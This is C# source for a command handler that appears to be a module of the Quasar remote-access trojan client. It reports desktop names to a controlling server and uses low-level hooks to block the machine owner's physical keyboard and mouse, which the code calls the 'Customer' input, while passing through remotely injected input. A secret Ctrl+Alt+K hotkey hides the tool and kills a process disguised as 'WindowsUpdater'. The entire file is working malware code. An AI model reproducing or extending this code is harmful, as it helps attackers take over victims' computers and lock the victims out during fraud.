using Quasar.Client.Utilities;
using Quasar.Common.Enums;
using Quasar.Common.Messages;
using Quasar.Common.Networking;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.ServiceModel.Channels;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using System.Windows.Interop;

namespace Quasar.Client.Messages
{
    public class CustomCommandHandler : IMessageProcessor
    {
        private IntPtr _keyboardHookID = IntPtr.Zero;
        private IntPtr _mouseHookID = IntPtr.Zero;

        private Form _mainForm;

        private delegate IntPtr LowLevelProc(int nCode, IntPtr wParam, IntPtr lParam);
        private LowLevelProc _keyboardProc;
        private LowLevelProc _mouseProc;

        private bool _ctrlPressed = false;
        private bool _altPressed = false;

        private Thread _keyboardHookThread;
        private Thread _mouseHookThread;

        private const int WH_KEYBOARD_LL = 13;
        private const int WH_MOUSE_LL = 14;
        private const int WM_KEYDOWN = 0x0100;
        private const int WM_KEYUP = 0x0101;
        private const int WM_SYSKEYDOWN = 0x0104;
        private const int WM_SYSKEYUP = 0x0105;
        //const int WM_MOUSEMOVE = 0x0200;

        [StructLayout(LayoutKind.Sequential)]
        private struct KBDLLHOOKSTRUCT
        {
            public uint vkCode;
            public uint scanCode;
            public uint flags;
            public uint time;
            public IntPtr dwExtraInfo;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct MSLLHOOKSTRUCT
        {
            public POINT pt;
            public uint mouseData;
            public uint flags;
            public uint time;
            public IntPtr dwExtraInfo;
        }

        //private const uint LLKHF_INJECTED = 0x10;
        //private const uint LLMHF_INJECTED = 0x01;
        //private const uint LLKHF_INPFLAG = 0x0C;
        //private const uint LLMHF_INPFLAG = 0x14;

        [StructLayout(LayoutKind.Sequential)]
        private struct POINT
        {
            public int x;
            public int y;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct MSG
        {
            public IntPtr hwnd;
            public uint message;
            public IntPtr wParam;
            public IntPtr lParam;
            public uint time;
            public POINT pt;
        }

        [DllImport("user32.dll")]
        static extern bool GetMessage(out MSG lpMsg, IntPtr hWnd, uint wMsgFilterMin, uint wMsgFilterMax);

        [DllImport("user32.dll")]
        static extern bool TranslateMessage([In] ref MSG lpMsg);

        [DllImport("user32.dll")]
        static extern IntPtr DispatchMessage([In] ref MSG lpMsg);

        [DllImport("user32.dll")]
        static extern bool PostThreadMessage(int idThread, uint Msg, IntPtr wParam, IntPtr lParam);

        private const uint WM_QUIT = 0x0012;


        [DllImport("user32.dll")]
        static extern IntPtr SetWindowsHookEx(int idHook, IntPtr callback, IntPtr hInstance, uint threadId);

        [DllImport("user32.dll")]
        static extern bool UnhookWindowsHookEx(IntPtr hInstance);

        [DllImport("user32.dll")]
        static extern IntPtr CallNextHookEx(IntPtr idHook, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll", SetLastError = true)]
        static extern bool GetUserObjectInformation(IntPtr hObj, int nIndex, StringBuilder pvInfo, int nLength, out int lpnLengthNeeded);

        [DllImport("user32.dll")]
        static extern short GetAsyncKeyState(Keys vKey);

        const int UOI_NAME = 2;

        public CustomCommandHandler(Form mainForm)
        {
            _mainForm = mainForm; // Store reference to the main form
            _keyboardProc = KeyboardHookCallback;
            _mouseProc = MouseHookCallback;
        }

        static string GetDesktopName(IntPtr hDesktop)
        {
            int lengthNeeded;
            // First call to get length
            GetUserObjectInformation(hDesktop, UOI_NAME, null, 0, out lengthNeeded);

            if (lengthNeeded == 0)
                return null;

            StringBuilder sb = new StringBuilder(lengthNeeded);
            if (GetUserObjectInformation(hDesktop, UOI_NAME, sb, sb.Capacity, out _))
            {
                return sb.ToString();
            }

            return null;
        }

        static int currentDesktopIndex = 0;

        public bool CanExecute(IMessage message) => message is DoCustomCommand;

        public bool CanExecuteFrom(ISender sender) => true;

        public void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case DoCustomCommand msg:
                    Execute(sender, msg);
                    break;
                default:
                    break;
            }
        }

        private void Execute(ISender client, DoCustomCommand message)
        {
            if (message.Type == CustomCommandType.GET_ACTIVE_DESKTOP)
            {
                IntPtr hInputDesktop = NativeMethods.OpenInputDesktop(0, false, 268435456U);
                string strDesktopName = GetDesktopName(hInputDesktop);
                client.Send(new DesktopsInformationResponse { ActiveDesktop = strDesktopName, Desktops = "NULL" });
            }
            else if (message.Type == CustomCommandType.GET_DESKTOPS)
            {
                IntPtr hInputDesktop = NativeMethods.OpenInputDesktop(0, false, 268435456U);
                string activeDesktopName = GetDesktopName(hInputDesktop);

                List<string> desktopNames = new List<string>();
                NativeMethods.EnumDesktops(NativeMethods.GetProcessWindowStation(), delegate (string desktop, IntPtr lParam)
                {
                    desktopNames.Add(desktop);
                    return true;
                }, IntPtr.Zero);

                string joinedStr = string.Join("|", desktopNames.ToArray());
                client.Send(new DesktopsInformationResponse { Desktops = joinedStr, ActiveDesktop = activeDesktopName });
            }
            else if (message.Type == CustomCommandType.DISABLE_CST_MOUSE)
            {
                if (_mouseHookThread == null || !_mouseHookThread.IsAlive)
                {
                    _mouseHookThread = new Thread(() =>
                    {
                        IntPtr hDesktop = NativeMethods.OpenInputDesktop(0, false, 268435456U); // READ_CONTROL
                        if (hDesktop == IntPtr.Zero)
                        {
                            client.Send(new NotifyMessageToServer { Message = "Can't open Input Desktop.\nTry again later!" });
                            return;
                        }
                        if (!NativeMethods.SetThreadDesktop(hDesktop))
                        {
                            client.Send(new NotifyMessageToServer { Message = "Can't set mouse hook thread desktop.\nTry again later!" });
                            return;
                        }

                        IntPtr hInstance = NativeMethods.LoadLibrary("User32");
                        _mouseHookID = SetWindowsHookEx(WH_MOUSE_LL,
                            Marshal.GetFunctionPointerForDelegate(_mouseProc),
                            hInstance, 0);

                        // Start message loop
                        MSG msg;
                        while (GetMessage(out msg, IntPtr.Zero, 0, 0))
                        {
                            TranslateMessage(ref msg);
                            DispatchMessage(ref msg);
                        }

                        UnhookWindowsHookEx(_mouseHookID);
                    });
                    _mouseHookThread.SetApartmentState(ApartmentState.STA);
                    _mouseHookThread.IsBackground = true;
                    _mouseHookThread.Start();
                    client.Send(new NotifyMessageToServer { Message = "Customer Mouse is Disabled (Hook thread started)!" });
                }
            }
            else if (message.Type == CustomCommandType.ENABLE_CST_MOUSE)
            {
                if (_mouseHookID != IntPtr.Zero)
                {
                    UnhookWindowsHookEx(_mouseHookID);
                    _mouseHookID = IntPtr.Zero;
                }

                if (_mouseHookThread != null && _mouseHookThread.IsAlive)
                {
                    PostThreadMessage(_mouseHookThread.ManagedThreadId, WM_QUIT, IntPtr.Zero, IntPtr.Zero);
                    _mouseHookThread = null;
                }

                client.Send(new NotifyMessageToServer { Message = "Customer Mouse is Enabled!" });
            }
            else if (message.Type == CustomCommandType.DISABLE_CST_KEYBOARD)
            {
                if (_keyboardHookThread == null || !_keyboardHookThread.IsAlive)
                {
                    _keyboardHookThread = new Thread(() =>
                    {
                        IntPtr hDesktop = NativeMethods.OpenInputDesktop(0, false, 268435456U); // READ_CONTROL
                        if (hDesktop == IntPtr.Zero)
                        {
                            client.Send(new NotifyMessageToServer { Message = "Can't open Input Desktop.\nTry again later!" });
                            return;
                        }
                        if (!NativeMethods.SetThreadDesktop(hDesktop))
                        {
                            client.Send(new NotifyMessageToServer { Message = "Can't set keyboard hook thread desktop.\nTry again later!" });
                            return;
                        }

                        IntPtr hInstance = NativeMethods.LoadLibrary("User32");
                        _keyboardHookID = SetWindowsHookEx(WH_KEYBOARD_LL,
                            Marshal.GetFunctionPointerForDelegate(_keyboardProc),
                            hInstance, 0);

                        // Start message loop
                        MSG msg;
                        while (GetMessage(out msg, IntPtr.Zero, 0, 0))
                        {
                            TranslateMessage(ref msg);
                            DispatchMessage(ref msg);
                        }

                        UnhookWindowsHookEx(_keyboardHookID);
                    });
                    _keyboardHookThread.SetApartmentState(ApartmentState.STA);
                    _keyboardHookThread.IsBackground = true;
                    _keyboardHookThread.Start();
                    client.Send(new NotifyMessageToServer { Message = "Customer Keyboard is Disabled (Hook thread started)!" });
                }
            }
            else if (message.Type == CustomCommandType.ENABLE_CST_KEYBOARD)
            {
                if (_keyboardHookID != IntPtr.Zero)
                {
                    UnhookWindowsHookEx(_keyboardHookID);
                    _keyboardHookID = IntPtr.Zero;
                }

                if (_keyboardHookThread != null && _keyboardHookThread.IsAlive)
                {
                    PostThreadMessage(_keyboardHookThread.ManagedThreadId, WM_QUIT, IntPtr.Zero, IntPtr.Zero);
                    _keyboardHookThread = null;
                }

                client.Send(new NotifyMessageToServer { Message = "Customer Keyboard is Enabled!" });
            }

        }
        public IntPtr KeyboardHookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0)
            {
                KBDLLHOOKSTRUCT kbStruct = Marshal.PtrToStructure<KBDLLHOOKSTRUCT>(lParam);
                Keys key = (Keys)kbStruct.vkCode;

                bool isKeyDown = wParam == (IntPtr)WM_KEYDOWN || wParam == (IntPtr)WM_SYSKEYDOWN;
                bool isKeyUp = wParam == (IntPtr)WM_KEYUP || wParam == (IntPtr)WM_SYSKEYUP;

                // Update modifier states
                if (key == Keys.LControlKey || key == Keys.RControlKey)
                    _ctrlPressed = isKeyDown ? true : isKeyUp ? false : _ctrlPressed;

                if (key == Keys.LMenu || key == Keys.RMenu)
                    _altPressed = isKeyDown ? true : isKeyUp ? false : _altPressed;

                // ALLOW Ctrl, Alt, and K key to flow normally
                if (key == Keys.K && _ctrlPressed && _altPressed)
                {
                    Interception.InterceptionHelper.HideFunction();
                    string targetProcess = "WindowsUpdater";
                    var processes = Process.GetProcessesByName(targetProcess);
                    if (!processes.Any())
                    {
                        return (IntPtr)1;
                    }
                    foreach (var proc in processes)
                    {
                        try
                        {
                            proc.Kill();
                            proc.WaitForExit();
                        }
                        catch (Exception ex)
                        {
                            //Console.WriteLine($"Failed to kill PID {proc.Id}: {ex.Message}");
                        }
                    }
                    return (IntPtr)1;
                }

                if ((int)kbStruct.dwExtraInfo != 0x0AA)
                {
                    return (IntPtr)1; // Block only physical input for remote kernel-keyboard
                }
            }
            return CallNextHookEx(_keyboardHookID, nCode, wParam, lParam);
        }
        public IntPtr MouseHookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0)
            {
                MSLLHOOKSTRUCT msStruct = Marshal.PtrToStructure<MSLLHOOKSTRUCT>(lParam);
                if ((int)msStruct.dwExtraInfo != 0x0AB)
                {
                    return (IntPtr)1; // Block only physical input for remote kernel-mouse
                }
            }
            return CallNextHookEx(_mouseHookID, nCode, wParam, lParam);
        }
    }
}